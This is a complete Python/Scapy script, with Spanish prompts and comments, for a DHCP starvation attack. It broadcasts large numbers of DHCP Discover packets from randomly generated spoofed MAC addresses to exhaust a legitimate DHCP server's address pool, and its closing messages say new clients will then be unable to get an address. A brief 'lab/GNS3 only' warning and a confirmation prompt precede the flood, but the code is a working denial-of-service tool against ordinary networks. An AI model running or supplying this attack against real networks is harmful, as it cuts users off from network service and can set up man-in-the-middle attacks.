#!/usr/bin/env python3
import os
import sys
import time
import random
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sendp, conf, RandMAC
)

def validar_ip(ip):
    partes = ip.split('.')
    if len(partes) != 4:
        return False
    for p in partes:
        if not p.isdigit() or not 0 <= int(p) <= 255:
            return False
    return True

def get_input(prompt, default=None, required_type=str):
    while True:
        valor = input(prompt)
        if valor == "" and default is not None:
            return default
        if valor == "" :
            print("Este campo no puede estar vacío.")
            continue
        if required_type == int:
            try:
                return int(valor)
            except ValueError:
                print("Debe ingresar un número entero.")
        else:
            return valor

def random_mac():
    """Genera una MAC aleatoria."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

def random_xid():
    """Genera un transaction ID aleatorio."""
    return random.randint(1, 0xFFFFFFFF)

def crear_dhcp_discover(mac):
    """Crea un paquete DHCP Discover con MAC falsa."""
    chaddr = bytes.fromhex(mac.replace(":", "")) + b'\x00' * 10

    eth = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
    ip  = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(
        op=1,
        chaddr=chaddr,
        xid=random_xid(),
        flags=0x8000  # Broadcast flag
    )
    dhcp = DHCP(options=[
        ("message-type", "discover"),
        ("hostname", "victim"),
        ("param_req_list", [1, 3, 6, 15, 28, 51, 58, 59]),
        "end"
    ])
    return eth / ip / udp / bootp / dhcp

def main():
    print("=== DHCP Starvation Attack ===\n")
    print("Este ataque agota el pool de IPs del servidor DHCP legítimo")
    print("enviando miles de DHCP Discover con MACs falsas.\n")

    interface = get_input("Interfaz de red (ej: eth0): ")
    paquetes  = get_input("Cantidad de paquetes a enviar [1000]: ", default=1000, required_type=int)
    delay     = get_input("Delay entre paquetes en segundos [0.01]: ", default="0.01")
    try:
        delay = float(delay)
    except ValueError:
        delay = 0.01

    print(f"\n--- Resumen ---")
    print(f"Interfaz:  {interface}")
    print(f"Paquetes:  {paquetes}")
    print(f"Delay:     {delay}s")
    print(f"Total est: {paquetes * delay:.1f} segundos")
    print("\n¡ATENCIÓN! Solo usar en entornos de laboratorio/GNS3.")
    confirm = input("¿Desea continuar? (s/N): ").lower()
    if confirm != 's':
        print("Abortado.")
        sys.exit(0)

    conf.iface = interface
    conf.verb  = 0  # Silenciar scapy

    print(f"\n[*] Iniciando DHCP Starvation en {interface}...")
    print("[*] Presiona Ctrl+C para detener\n")

    enviados  = 0
    macs_usadas = []

    try:
        for i in range(paquetes):
            mac = random_mac()
            macs_usadas.append(mac)
            pkt = crear_dhcp_discover(mac)
            sendp(pkt, iface=interface, verbose=False)
            enviados += 1

            # Mostrar progreso cada 50 paquetes
            if enviados % 50 == 0:
                porcentaje = (enviados / paquetes) * 100
                print(f"[+] Enviados: {enviados}/{paquetes} ({porcentaje:.1f}%) | Última MAC: {mac}")

            time.sleep(delay)

    except KeyboardInterrupt:
        print(f"\n[!] Ataque detenido manualmente.")

    print(f"\n=== Resumen final ===")
    print(f"[*] Paquetes enviados: {enviados}")
    print(f"[*] MACs únicas usadas: {len(macs_usadas)}")
    print(f"[*] El pool DHCP debería estar agotado.")
    print(f"[*] Nuevos clientes no podrán obtener IP del servidor legítimo.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Este script necesita permisos de superusuario (sudo).")
        sys.exit(1)
    main()
